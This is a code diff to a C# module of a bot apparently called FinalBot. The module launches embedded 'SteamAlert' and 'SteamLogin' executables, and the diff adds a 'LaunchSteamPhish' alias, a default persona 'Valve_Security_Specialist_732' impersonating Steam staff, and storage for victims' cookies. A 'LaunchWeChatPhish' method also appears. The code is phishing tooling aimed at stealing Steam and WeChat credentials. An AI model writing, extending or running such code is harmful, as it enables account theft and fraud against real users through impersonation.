@@ -63,32 +63,50 @@ namespace FinalBot.Modules
             }
         }
 
+        private static string _savedAgentName = "Valve_Security_Specialist_732";
+        private static string _savedVacLang = "en";
+        private static string _savedCookies = "";
+
+        public static void SetAgentName(string name) => _savedAgentName = name;
+        public static void SetVacLang(string lang) => _savedVacLang = lang;
+        public static void SetCookies(string cookies) => _savedCookies = cookies;
+        public static string GetAgentName() => _savedAgentName;
+        public static string GetVacLang() => _savedVacLang;
+
         public static void LaunchSteamAlert()
         {
+            PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
             string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
             if (!string.IsNullOrEmpty(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
-                    Arguments = "--udp 51337",
+                    Arguments = $"--udp 51337 --lang {_savedVacLang}",
                     UseShellExecute = true
                 });
             }
         }
 
-        public static void LaunchSteamLogin()
+        public static void LaunchSteamLogin(string lang = "en")
         {
+            PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
             string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
             if (!string.IsNullOrEmpty(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
-                    Arguments = "--udp 51337",
+                    Arguments = $"--udp 51337 --lang {lang}",
                     UseShellExecute = true
                 });
             }
+        }
+
+        public static void LaunchSteamPhish()
+        {
+            // Just an alias for SteamLogin with current saved settings
+            LaunchSteamLogin(_savedVacLang);
         }
 
         public static void LaunchWeChatPhish()
@@ -124,9 +142,14 @@ namespace FinalBot.Modules
         public static void PrepareSteamFiles(string agentName, string cookies, string vacLang)
         {
             // Use a stable, temporary directory for shared files
-            string tablichkaDir = Path.Combine(Path.GetTempPath(), "FinalTempSys", "tablichka");
+            string tempRoot = Path.Combine(Path.GetTempPath(), "FinalTempSys");
+            string tablichkaDir = Path.Combine(tempRoot, "tablichka");
             if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
             
+            // Also ensure 'okno' exists as a subfolder if needed by the Python side
+            string oknoDir = Path.Combine(tempRoot, "okno");
+            if (!Directory.Exists(oknoDir)) Directory.CreateDirectory(oknoDir);
+
             // Clean old files to ensure fresh data
             try { foreach (var file in Directory.GetFiles(tablichkaDir)) File.Delete(file); } catch { }
 
